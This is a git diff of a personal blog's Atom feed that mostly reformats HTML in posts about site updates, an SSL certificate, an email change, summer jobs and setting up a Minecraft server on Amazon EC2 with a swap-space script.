-&lt;li&gt;The #crypto channel on the &lt;a href=&quot;http://freenode.net/&quot;&gt;Freenode IRC network&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.base64decode.org/&quot;&gt;Base-64 decoder&lt;/a&gt; to decode the base-64 strings&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.w3schools.com/jsref/met_win_atob.asp&quot;&gt;w3schools&lt;/a&gt; to brush up on basic JavaScript&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://php.net/manual/en/index.php&quot;&gt;The PHP Manual&lt;/a&gt; for a refresher on common PHP functions&lt;/li&gt;
+  &lt;li&gt;The #crypto channel on the &lt;a href=&quot;http://freenode.net/&quot;&gt;Freenode IRC network&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </content>
  </entry>
@@ -225,37 +222,37 @@ It seems that the same entity might be responsible for both exploits.&lt;/p&gt;
    <content type="html">&lt;p&gt;This past spring break I decided that I &lt;em&gt;really&lt;/em&gt; needed to dust off my website
 and start using it for what I originally intended: documenting the neat projects
 I work on, writing about the topics that interest me, and serving as a hub for
-my overall Internet presence. The improvements I&amp;#39;ve made should hopefully put
+my overall Internet presence. The improvements I’ve made should hopefully put
 some momentum behind that. In short, I made some layout changes to the site to
 make it more readable, aquired a Class 2 SSL Certificate from StartSSL, and
-am switching my personal e-mail address to &lt;a href=&quot;mailto:brandon@brandonsilver.com&quot;&gt;brandon@brandonsilver.com&lt;/a&gt; (with
+am switching my personal e-mail address to &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#098;&amp;#114;&amp;#097;&amp;#110;&amp;#100;&amp;#111;&amp;#110;&amp;#064;&amp;#098;&amp;#114;&amp;#097;&amp;#110;&amp;#100;&amp;#111;&amp;#110;&amp;#115;&amp;#105;&amp;#108;&amp;#118;&amp;#101;&amp;#114;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&quot;&gt;&amp;#098;&amp;#114;&amp;#097;&amp;#110;&amp;#100;&amp;#111;&amp;#110;&amp;#064;&amp;#098;&amp;#114;&amp;#097;&amp;#110;&amp;#100;&amp;#111;&amp;#110;&amp;#115;&amp;#105;&amp;#108;&amp;#118;&amp;#101;&amp;#114;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&lt;/a&gt; (with
 a new GPG key to go with it).&lt;/p&gt;
 
 &lt;!--more--&gt;
 
-&lt;h3&gt;Layout changes&lt;/h3&gt;
+&lt;h3 id=&quot;layout-changes&quot;&gt;Layout changes&lt;/h3&gt;
 
-&lt;p&gt;I&amp;#39;ve made a few changes to the CSS of the site. Major updates include making the font sizes larger and increasing the width of the content area to match. I also switched the twitter widgets out due to warnings I was getting in the JavaScript console that my old ones were losing support.&lt;/p&gt;
+&lt;p&gt;I’ve made a few changes to the CSS of the site. Major updates include making the font sizes larger and increasing the width of the content area to match. I also switched the twitter widgets out due to warnings I was getting in the JavaScript console that my old ones were losing support.&lt;/p&gt;
 
-&lt;p&gt;I&amp;#39;ve also added &lt;a href=&quot;/archives.html&quot;&gt;archive functionality&lt;/a&gt; so that only the five most recent posts are displayed on the front page, with all of the posts available on the archives page. I did this by adding some &lt;a href=&quot;https://github.com/shopify/liquid/wiki/liquid-for-designers&quot;&gt;liquid templating logic&lt;/a&gt; to the index:&lt;/p&gt;
+&lt;p&gt;I’ve also added &lt;a href=&quot;/archives.html&quot;&gt;archive functionality&lt;/a&gt; so that only the five most recent posts are displayed on the front page, with all of the posts available on the archives page. I did this by adding some &lt;a href=&quot;https://github.com/shopify/liquid/wiki/liquid-for-designers&quot;&gt;liquid templating logic&lt;/a&gt; to the index:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/2013/03/31/liquid_logic_post_list.png&quot; alt=&quot;screenshot of the logic used to list the five most recent posts&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2013/03/31/liquid_logic_post_list.png&quot; alt=&quot;screenshot of the logic used to list the five most recent posts&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;You can see the rest of my changes at this blog&amp;#39;s repository on &lt;a href=&quot;https://github.com/brandonsilver/jekyll-blog&quot;&gt;Github&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;You can see the rest of my changes at this blog’s repository on &lt;a href=&quot;https://github.com/brandonsilver/jekyll-blog&quot;&gt;Github&lt;/a&gt;.&lt;/p&gt;
 
-&lt;h3&gt;Security/trust improvements: SSL&lt;/h3&gt;
+&lt;h3 id=&quot;securitytrust-improvements-ssl&quot;&gt;Security/trust improvements: SSL&lt;/h3&gt;
 
-&lt;p&gt;I also went to the trouble to get a Class 2 SSL Certificate from &lt;a href=&quot;http://www.startssl.com/&quot;&gt;StartSSL&lt;/a&gt;. You can access my website through SSL using &lt;a href=&quot;https://www.brandonsilver.com/&quot;&gt;https://www.brandonsilver.com/&lt;/a&gt;, &lt;strike&gt;but your browser may not indicate the connection is fully secure due to the Twitter and Disqus widgets that come from outside of the encrypted connection. Otherwise I would have began redirecting everything to the SSL-enabled URL by default (this is one of a couple of reasons I&amp;#39;m considering dropping all of the outside-hosted stuff from my website, I&amp;#39;ll post about that in more detail later).&lt;/strike&gt; &lt;strong&gt;UPDATE&lt;/strong&gt; &lt;em&gt;I&amp;#39;ve since fixed this issue, and the website now goes through SSL by default.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;I also went to the trouble to get a Class 2 SSL Certificate from &lt;a href=&quot;http://www.startssl.com/&quot;&gt;StartSSL&lt;/a&gt;. You can access my website through SSL using &lt;a href=&quot;https://www.brandonsilver.com/&quot;&gt;https://www.brandonsilver.com/&lt;/a&gt;, &lt;strike&gt;but your browser may not indicate the connection is fully secure due to the Twitter and Disqus widgets that come from outside of the encrypted connection. Otherwise I would have began redirecting everything to the SSL-enabled URL by default (this is one of a couple of reasons I&#39;m considering dropping all of the outside-hosted stuff from my website, I&#39;ll post about that in more detail later).&lt;/strike&gt; &lt;strong&gt;UPDATE&lt;/strong&gt; &lt;em&gt;I’ve since fixed this issue, and the website now goes through SSL by default.&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;As far as StartSSL goes, the application process for my Class 2 Certificate was very simple and easy to follow. For the Class 2 Certificate, they require two forms of picture ID and then contact you via phone to ask further questions to verify your identity. After successful verification, they then provide you with the certificates you need, including wild card certificates. StartSSL also provides &lt;strong&gt;free&lt;/strong&gt; Class 1 Certificates if you aren&amp;#39;t interested in going through the extra verification or paying the (very, &lt;em&gt;very&lt;/em&gt; low price as far as most certificates go) $59.90 required for the more extensive certificate.&lt;/p&gt;
+&lt;p&gt;As far as StartSSL goes, the application process for my Class 2 Certificate was very simple and easy to follow. For the Class 2 Certificate, they require two forms of picture ID and then contact you via phone to ask further questions to verify your identity. After successful verification, they then provide you with the certificates you need, including wild card certificates. StartSSL also provides &lt;strong&gt;free&lt;/strong&gt; Class 1 Certificates if you aren’t interested in going through the extra verification or paying the (very, &lt;em&gt;very&lt;/em&gt; low price as far as most certificates go) $59.90 required for the more extensive certificate.&lt;/p&gt;
 
-&lt;h3&gt;Change in primary email, GnuPG key&lt;/h3&gt;
+&lt;h3 id=&quot;change-in-primary-email-gnupg-key&quot;&gt;Change in primary email, GnuPG key&lt;/h3&gt;
 
-&lt;p&gt;I&amp;#39;m switching my primary personal email address to &lt;a href=&quot;mailto:brandon@brandonsilver.com&quot;&gt;brandon@brandonsilver.com&lt;/a&gt; since I haven&amp;#39;t done anything with my old Silver Imaging website in quite a while and have no plans to use it in the future. You can look up my new PGP public key on most public key servers.&lt;/p&gt;
+&lt;p&gt;I’m switching my primary personal email address to &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#098;&amp;#114;&amp;#097;&amp;#110;&amp;#100;&amp;#111;&amp;#110;&amp;#064;&amp;#098;&amp;#114;&amp;#097;&amp;#110;&amp;#100;&amp;#111;&amp;#110;&amp;#115;&amp;#105;&amp;#108;&amp;#118;&amp;#101;&amp;#114;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&quot;&gt;&amp;#098;&amp;#114;&amp;#097;&amp;#110;&amp;#100;&amp;#111;&amp;#110;&amp;#064;&amp;#098;&amp;#114;&amp;#097;&amp;#110;&amp;#100;&amp;#111;&amp;#110;&amp;#115;&amp;#105;&amp;#108;&amp;#118;&amp;#101;&amp;#114;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&lt;/a&gt; since I haven’t done anything with my old Silver Imaging website in quite a while and have no plans to use it in the future. You can look up my new PGP public key on most public key servers.&lt;/p&gt;
 
-&lt;h3&gt;Improvements still on the roadmap&lt;/h3&gt;
+&lt;h3 id=&quot;improvements-still-on-the-roadmap&quot;&gt;Improvements still on the roadmap&lt;/h3&gt;
 
-&lt;p&gt;I plan on adding a &amp;quot;bread crumb&amp;quot; style navigation system to the area above each post which will make page navigation more clear. I&amp;#39;m also considering getting rid of the Disqus and Twitter widgets since they seem to be adding a bunch of tracking cookies not related to the function of my website, which in turn means a compromise of privacy for those who visit pages containing those elements on my website. I&amp;#39;ll expand on this issue in more detail at a later date.&lt;/p&gt;
+&lt;p&gt;I plan on adding a “bread crumb” style navigation system to the area above each post which will make page navigation more clear. I’m also considering getting rid of the Disqus and Twitter widgets since they seem to be adding a bunch of tracking cookies not related to the function of my website, which in turn means a compromise of privacy for those who visit pages containing those elements on my website. I’ll expand on this issue in more detail at a later date.&lt;/p&gt;
 </content>
  </entry>
  
@@ -264,7 +261,7 @@ a new GPG key to go with it).&lt;/p&gt;
    <link href="http://www.brandonsilver.com/2012/02/16/New-Notes-Website.html"/>
    <updated>2012-02-16T00:00:00-06:00</updated>
    <id>http://www.brandonsilver.com/2012/02/16/New-Notes-Website</id>
-   <content type="html">&lt;p&gt;I&amp;#39;ve just finished making a seperate website for my school notes. You can find it at &lt;a href=&quot;http://notes.brandonsilver.com/&quot;&gt;notes.brandonsilver.com&lt;/a&gt;.
+   <content type="html">&lt;p&gt;I’ve just finished making a seperate website for my school notes. You can find it at &lt;a href=&quot;http://notes.brandonsilver.com/&quot;&gt;notes.brandonsilver.com&lt;/a&gt;.
 I started it mostly because I already took my Computer Science II notes in markdown, and I wanted a more
 readable medium for those notes than just vim. Plus, others in my class might be interested as well, so I went ahead
 and started a new &lt;a href=&quot;https://github.com/mojombo/jekyll/wiki&quot;&gt;jekyll-based&lt;/a&gt; site for those notes, complete with fancy &lt;a href=&quot;http://pygments.org/&quot;&gt;Pygments&lt;/a&gt; syntax highlighting for the
@@ -277,35 +274,35 @@ multitude of Java code fragments.&lt;/p&gt;
    <link href="http://www.brandonsilver.com/2011/07/16/Summer-Update.html"/>
    <updated>2011-07-16T00:00:00-05:00</updated>
    <id>http://www.brandonsilver.com/2011/07/16/Summer-Update</id>
-   <content type="html">&lt;p&gt;This summer started out uneventful enough. For most of June I didn&amp;#39;t do
+   <content type="html">&lt;p&gt;This summer started out uneventful enough. For most of June I didn’t do
 very much. Sure, I did tidy up the yard a bit, but not a whole lot besides that.&lt;/p&gt;
 
 &lt;!--more--&gt;
 
-&lt;h3&gt;Volunteer Work&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/2011/07/16/hopecenter.jpg&quot; alt=&quot;Image of the HOPE Center of Edmond&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;volunteer-work&quot;&gt;Volunteer Work&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2011/07/16/hopecenter.jpg&quot; alt=&quot;Image of the HOPE Center of Edmond&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;However, toward the end of June I started volunteering at the &lt;a href=&quot;http://www.hopecenterofedmond.com&quot;&gt;Hope Center of Edmond&lt;/a&gt;,
 specifically in their food pantry. The folks over at the HOPE Center are a
 pleasure to work with, and I feel like I am making a positive contribution
 to our community. Overall I am very grateful for the experience
-that the HOPE Center has provided me with. &lt;/p&gt;
+that the HOPE Center has provided me with.&lt;/p&gt;
 
-&lt;h3&gt;Actual Employment&lt;/h3&gt;
+&lt;h3 id=&quot;actual-employment&quot;&gt;Actual Employment&lt;/h3&gt;
 
-&lt;p&gt;I have also been working as a waiter at &lt;a href=&quot;http://maps.google.com/maps/place?cid=3401404715024300847&amp;amp;q=Al&amp;#x27;s+Cafe+and+Grill,+Edmond,+OK&amp;amp;hl=en&amp;amp;ved=0CBAQ-gswAA&amp;amp;sa=X&amp;amp;ei=oOYfTuDOFZCUzATw942UBA&amp;amp;sig2=KN3QWgRGOPPQ1VY8mO0fEw&quot;&gt;Al&amp;#39;s Cafe and Grill&lt;/a&gt; for the past two and a half
-weeks. It&amp;#39;s a small, old-fashioned onion burger joint that also has some delicious daily specials. 
+&lt;p&gt;I have also been working as a waiter at &lt;a href=&quot;http://maps.google.com/maps/place?cid=3401404715024300847&amp;amp;q=Al&#39;s+Cafe+and+Grill,+Edmond,+OK&amp;amp;hl=en&amp;amp;ved=0CBAQ-gswAA&amp;amp;sa=X&amp;amp;ei=oOYfTuDOFZCUzATw942UBA&amp;amp;sig2=KN3QWgRGOPPQ1VY8mO0fEw&quot;&gt;Al’s Cafe and Grill&lt;/a&gt; for the past two and a half
+weeks. It’s a small, old-fashioned onion burger joint that also has some delicious daily specials. 
 The work is hard (and at times, messy too) but I love to work there. Everyday I learn something new
 and interesting about the restaurant business.&lt;/p&gt;
 
-&lt;h3&gt;More Employment&lt;/h3&gt;
+&lt;h3 id=&quot;more-employment&quot;&gt;More Employment&lt;/h3&gt;
 
-&lt;p&gt;And if all of that wasn&amp;#39;t enough, I&amp;#39;m also doing contractual work for &lt;a href=&quot;http://www.stammwebcreations.com/&quot;&gt;Stamm Web Creations&lt;/a&gt;.
-I&amp;#39;m mostly building and managing WordPress-based websites, but I do other tech-related jobs
-for them as well. &lt;/p&gt;
+&lt;p&gt;And if all of that wasn’t enough, I’m also doing contractual work for &lt;a href=&quot;http://www.stammwebcreations.com/&quot;&gt;Stamm Web Creations&lt;/a&gt;.
+I’m mostly building and managing WordPress-based websites, but I do other tech-related jobs
+for them as well.&lt;/p&gt;
 
-&lt;p&gt;So, that&amp;#39;s what I&amp;#39;ve been up to so far this summer. When school is close to starting I&amp;#39;ll post a summer-in-review post too.&lt;/p&gt;
+&lt;p&gt;So, that’s what I’ve been up to so far this summer. When school is close to starting I’ll post a summer-in-review post too.&lt;/p&gt;
+
 </content>
  </entry>
  
@@ -314,9 +311,9 @@ for them as well. &lt;/p&gt;
    <link href="http://www.brandonsilver.com/2011/05/30/And-we're-back!.html"/>
    <updated>2011-05-30T00:00:00-05:00</updated>
    <id>http://www.brandonsilver.com/2011/05/30/And-we're-back!</id>
-   <content type="html">&lt;p&gt;After a brief hiatus the cause of which I am too embarrassed to speak of, brandonsilver.com is back up and running. On a completely unrelated note, I would highly recommend NOT allowing your domains to expire in order to re-register in the hopes of doing so more cheaply than an actual transfer. When they expire, they automatically fall into a 30-day limbo of sorts where no one can re-register them save for the original registrant (and a lot of good that does if you&amp;#39;ve canceled your account with said registrant). Basically, find a good domain host &lt;strong&gt;and stick with it&lt;/strong&gt;. &lt;/p&gt;
+   <content type="html">&lt;p&gt;After a brief hiatus the cause of which I am too embarrassed to speak of, brandonsilver.com is back up and running. On a completely unrelated note, I would highly recommend NOT allowing your domains to expire in order to re-register in the hopes of doing so more cheaply than an actual transfer. When they expire, they automatically fall into a 30-day limbo of sorts where no one can re-register them save for the original registrant (and a lot of good that does if you’ve canceled your account with said registrant). Basically, find a good domain host &lt;strong&gt;and stick with it&lt;/strong&gt;.&lt;/p&gt;
 
-&lt;p&gt;Any who, what have I been up to these past months sans-website? I&amp;#39;ve been pretty busy, actually, what with graduating high school and all. Hopefully I&amp;#39;ll stay busy through the summer and not go stir-crazy with boredom at home. &lt;/p&gt;
+&lt;p&gt;Any who, what have I been up to these past months sans-website? I’ve been pretty busy, actually, what with graduating high school and all. Hopefully I’ll stay busy through the summer and not go stir-crazy with boredom at home.&lt;/p&gt;
 </content>
  </entry>
  
@@ -325,90 +322,89 @@ for them as well. &lt;/p&gt;
    <link href="http://www.brandonsilver.com/2011/03/04/minecraft-on-amazon-ec2.html"/>
    <updated>2011-03-04T00:00:00-06:00</updated>
    <id>http://www.brandonsilver.com/2011/03/04/minecraft-on-amazon-ec2</id>
-   <content type="html">&lt;p&gt;Over the past couple of weeks, I&amp;#39;ve been using my free Amazon EC2 Micro instance as a &lt;a href=&quot;http://www.minecraft.net&quot;&gt;Minecraft&lt;/a&gt; server. It isn&amp;#39;t ideal, but it works well enough to replace the aging PC I was using before. Plus, I can feel safe allowing people onto the server, as before I would have to expose my home network to the Internet for the same experience. &lt;/p&gt;
+   <content type="html">&lt;p&gt;Over the past couple of weeks, I’ve been using my free Amazon EC2 Micro instance as a &lt;a href=&quot;http://www.minecraft.net&quot;&gt;Minecraft&lt;/a&gt; server. It isn’t ideal, but it works well enough to replace the aging PC I was using before. Plus, I can feel safe allowing people onto the server, as before I would have to expose my home network to the Internet for the same experience.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;UPDATE 2013-05-09:&lt;/strong&gt; I&amp;#39;ve added a section on how to add swap space to EC2.
+&lt;p&gt;&lt;strong&gt;UPDATE 2013-05-09:&lt;/strong&gt; I’ve added a section on how to add swap space to EC2.
 This can alleviate problems encountered when more than a couple of players are
 on the server.&lt;/p&gt;
 
 &lt;!--more--&gt;
 
-&lt;h3&gt;Setup&lt;/h3&gt;
+&lt;h3 id=&quot;setup&quot;&gt;Setup&lt;/h3&gt;
 
 &lt;p&gt;&lt;em&gt;(This post assumes that you already have a running instance. If you are interested in setting up your own EC2 Instance from scratch, have a look at &lt;a href=&quot;http://www.stratumsecurity.com/blog/2010/12/03/shearing-firesheep-with-the-cloud/&quot;&gt;http://www.stratumsecurity.com/blog/2010/12/03/shearing-firesheep-with-the-cloud/&lt;/a&gt;. It also shows you how to setup an OpenVPN server.)&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;As it is my first Minecraft server, I decided to use the vanilla server from &lt;a href=&quot;http://www.minecraft.net/download.jsp&quot;&gt;Mojang Specifications&lt;/a&gt;. It isn&amp;#39;t as feature-packed as others like HeyO, but it is relatively simple to get going. My instance (Ubuntu Server 10.04, ami-4a0df923 on EC2) didn&amp;#39;t have the Java Runtime Environment pre-installed, so I installed it using apt-get:&lt;/p&gt;
+&lt;p&gt;As it is my first Minecraft server, I decided to use the vanilla server from &lt;a href=&quot;http://www.minecraft.net/download.jsp&quot;&gt;Mojang Specifications&lt;/a&gt;. It isn’t as feature-packed as others like HeyO, but it is relatively simple to get going. My instance (Ubuntu Server 10.04, ami-4a0df923 on EC2) didn’t have the Java Runtime Environment pre-installed, so I installed it using apt-get:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;sudo apt-get install openjdk-6-jre-headless&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;sudo apt-get install openjdk-6-jre-headless&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;I then proceeded to download the latest version of the server:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;wget http://www.minecraft.net/download/minecraft_server.jar?v=1299034714859&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;wget http://www.minecraft.net/download/minecraft_server.jar?v=1299034714859&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;At this point, I also made sure that &lt;a href=&quot;http://www.gnu.org/software/screen/&quot;&gt;GNU screen&lt;/a&gt; was installed so I could run minecraft-server in the background between SSH sessions.&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;sudo apt-get install screen&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;sudo apt-get install screen&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Since I am running the server in a low-memory environment, I adjusted the instructions given on the &lt;a href=&quot;http://www.minecraft.net/download.jsp&quot;&gt;download page&lt;/a&gt; to suit and put it all in a small startup script, start.sh, which I placed in the same directory as minecraft-server.jar:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# Minecraft Server startup script&lt;/span&gt;
-java -Xmx500M -Xms500M -jar minecraft-server.jar nogui&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+java -Xmx500M -Xms500M -jar minecraft-server.jar nogui&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;This should allow the server to startup without error. Make sure that start.sh has executable permissions via &lt;code&gt;chmod +x start.sh&lt;/code&gt; .&lt;/p&gt;
 
-&lt;p&gt;Now it&amp;#39;s time to start the server with the following commands, replacing &lt;code&gt;/path/to/minecraft-server&lt;/code&gt; with whatever path you downloaded minecraft-server.jar to:&lt;/p&gt;
+&lt;p&gt;Now it’s time to start the server with the following commands, replacing &lt;code&gt;/path/to/minecraft-server&lt;/code&gt; with whatever path you downloaded minecraft-server.jar to:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;screen -DR&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;cd /path/to/minecraft-server&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;./start.sh&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;screen -DR
+cd /path/to/minecraft-server
+./start.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;You should now be at the minecraft server console. For the final step, you need to adjust your Amazon EC2 Security Policy to allow TCP connections to port 25565. After that, you can finally fire up Minecraft, go to Multiplayer, and punch in your server&amp;#39;s public IP address. &lt;/p&gt;
+&lt;p&gt;You should now be at the minecraft server console. For the final step, you need to adjust your Amazon EC2 Security Policy to allow TCP connections to port 25565. After that, you can finally fire up Minecraft, go to Multiplayer, and punch in your server’s public IP address.&lt;/p&gt;
 
-&lt;h3&gt;Setting up Swap Space&lt;/h3&gt;
-
+&lt;h3 id=&quot;setting-up-swap-space&quot;&gt;Setting up Swap Space&lt;/h3&gt;
 &lt;p&gt;If you run into performance issues when running the server, you can try
 adding some swap space to supplement the RAM. I found the following script
 to do just that (copy &amp;amp; paste it into a file called swap.sh):&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash -e&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash -e&lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;# Set default variable values&lt;/span&gt;
-: &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SWAP_SIZE_MEGABYTES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:=1024&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
-: &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SWAP_FILE_LOCATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:=/var/swap.space&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+: &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SWAP_SIZE_MEGABYTES&lt;/span&gt;:&lt;span class=&quot;p&quot;&gt;=1024&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+: &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SWAP_FILE_LOCATION&lt;/span&gt;:&lt;span class=&quot;p&quot;&gt;=/var/swap.space&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt; SWAP_SIZE_MEGABYTES &amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;No swap size provided, exiting.&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt; SWAP_SIZE_MEGABYTES &amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;No swap size provided, exiting.&#39;&lt;/span&gt;
     &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
-&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;$SWAP_FILE_LOCATION&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;$SWAP_FILE_LOCATION&amp;quot;&lt;/span&gt; already exists,  skipping.  
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_FILE_LOCATION&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_FILE_LOCATION&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; already exists,  skipping.  
+&lt;span class=&quot;k&quot;&gt;fi
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; ! swapon -s &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -qF &lt;span class=&quot;s2&quot;&gt;&amp;quot;$SWAP_FILE_LOCATION&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Creating &lt;span class=&quot;s2&quot;&gt;&amp;quot;$SWAP_FILE_LOCATION&amp;quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&amp;quot;$SWAP_SIZE_MEGABYTES&amp;quot;&lt;/span&gt;MB.
